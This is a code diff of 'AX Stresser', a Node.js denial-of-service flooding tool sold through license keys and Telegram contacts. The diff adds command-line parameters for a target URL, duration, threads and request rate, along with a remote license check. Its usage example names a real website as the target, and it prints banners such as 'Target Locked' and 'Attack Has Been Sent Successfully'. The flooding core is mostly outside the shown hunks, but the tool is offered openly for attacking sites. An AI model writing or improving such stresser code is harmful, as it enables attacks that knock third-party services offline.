@@ -1,37 +1,51 @@
 const axios = require('axios');
-const readline = require('readline');
 
-async function validateKey(inputKey) {
-    try {
-        const response = await axios.get('https://api.khalid10.xyz/AX-Stresser/key.json');
-        const keys = response.data.keys;
+function validateKeyAndStartScript(inputKey, targetURL, time, threads, requestsPerSecond) {
+    axios.get('https://api.khalid10.xyz/AX-Stresser/key.json')
+        .then(response => {
+            const keys = response.data.keys;
+            const matchingKey = keys.find(storedKey => storedKey.key === inputKey);
 
-        const matchingKey = keys.find(storedKey => storedKey.key === inputKey);
-
-        if (matchingKey) {
-            console.log('Authentication successful. Your script can proceed.');
-            startScript(); // Call the main function if the key is valid
-        } else {
-            console.log('Invalid key. Please contact https://t.me/KHALID_MODZ to get a valid key.');
-            process.exit(1); // Exit the process if the key is invalid
-        }
-    } catch (error) {
-        console.error('Error occurred while validating key:', error.message);
-        process.exit(1); // Exit the process if an error occurs
-    }
+            if (matchingKey) {
+    console.log(``);
+    console.log(``);
+                console.log('\033[92m [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> 𝙰𝚞𝚝𝚑𝚎𝚗𝚝𝚒𝚌𝚊𝚝𝚒𝚘𝚗 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 ! \033[97m');
+                    console.log(``);
+    console.log(``);
+                startScript(targetURL, time, threads, requestsPerSecond);
+            } else {
+    console.log(``);
+    console.log(``);
+                console.log('\033[38;2;255;23;68m [ 𝐅𝐀𝐈𝐋𝐄𝐃 ] -> 𝚄𝚗𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚄𝚜𝚎𝚛 !\033[97m');
+                    console.log(``);
+    console.log(``);
+               process.exit();
+            }
+        })
+        .catch(error => {
+    console.log(``);
+    console.log(``);
+            console.error('\033[38;2;255;23;68m [ 𝐅𝐀𝐈𝐋𝐄𝐃 ] -> 𝙴𝚛𝚛𝚘𝚛 𝙾𝚌𝚌𝚞𝚛𝚛𝚎𝚍 𝚆𝚑𝚒𝚕𝚎 𝚅𝚊𝚕𝚒𝚍𝚊𝚝𝚒𝚗𝚐 𝚔𝚎𝚢:', error.message); 
+                console.log(``);
+    console.log(``);
+process.exit();
+        });
 }
 
-function startScript() {
-    const net = require("net");
-    const http2 = require("http2");
-    const tls = require("tls");
-    const cluster = require("cluster");
-    const url = require("url");
-    const crypto = require("crypto");
-    const fs = require("fs");
-    
-    console.clear();
+function startScript(targetURL, time, threads, requestsPerSecond) {
+    console.log('\033[92m [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> 𝚃𝚊𝚛𝚐𝚎𝚝 𝙻𝚘𝚌𝚔𝚎𝚍 𝙱𝚢 𝚃𝚎𝚊𝚖 𝙰𝚇 \033[97m');
     // Rest of your script goes here...
+
+    // Example of a loop to keep the script running until user exits
+ //Developed By Khalid Mahmud
+ const net = require("net");
+ const http2 = require("http2");
+ const tls = require("tls");
+ const cluster = require("cluster");
+ const url = require("url");
+ const crypto = require("crypto");
+ const fs = require("fs");
+ 
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
 
@@ -129,6 +143,7 @@ function startScript() {
     console.log(``);
     console.log(`\x1b[36m        𝔸𝕏 𝕊𝕋ℝ𝔼𝕊𝕊𝔼ℝ [𝔹𝔼𝕋𝔸]`);
     console.log(`\x1b[36m        𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 𝐓𝐞𝐚𝐦 𝐀𝐗`);
+    console.log(`\x1b[36m 𝗵𝘁𝘁𝗽𝘀://𝘁.𝗺𝗲/𝗧𝗲𝗮𝗺𝗔𝗫_𝟬𝟯`);
     console.log(``);
     console.log(``);
     console.log(`\x1b[0m        [ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ] -> Attack Has Been Sent Successfully`);
@@ -335,14 +350,46 @@ function startScript() {
  process.on('uncaughtException', error => {});
  process.on('unhandledRejection', error => {});
 
+    const interval = setInterval(() => {
+       
+    }, 2000);
 }
 
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
+function askForKey(targetURL, time, threads, requestsPerSecond) {
+    const readline = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
 
-rl.question('Enter your key: ', (key) => {
-    validateKey(key.trim());
-    rl.close();
+    readline.question('𝙴𝚗𝚝𝚎𝚛 𝚈𝚘𝚞𝚛 𝙻𝚒𝚌𝚎𝚗𝚌𝚎 𝙺𝚎𝚢: ', key => {
+        validateKeyAndStartScript(key, targetURL, time, threads, requestsPerSecond);
+        readline.close();
+    });
+}
+
+function runWithArgs(args) {
+    const targetURL = args[2];
+    const time = args[3];
+    const threads = args[4];
+    const requestsPerSecond = args[5];
+    const key = args[6];
+
+    validateKeyAndStartScript(key, targetURL, time, threads, requestsPerSecond);
+}
+
+// Check if enough arguments are provided from the command line
+if (process.argv.length >= 7) {
+    runWithArgs(process.argv);
+} else {
+    console.log(`\x1b[36m        Usage: node AX.js URL TIME REQ_PER_SEC THREADS LICENCE_KEY\nExample: node AX.js https://xnxx.com/ 500 8 1 0000`); 
+    
+    console.log(``);
+    console.log(``);
+    console.log('\033[92m Want Key? Contact Me -> https://t.me/KHALID_MODZ');
+    process.exit();
+}
+
+// Wait for user input to prevent automatic exit
+process.stdin.on('data', () => {
+    // User input detected, do nothing to prevent automatic exit
 });
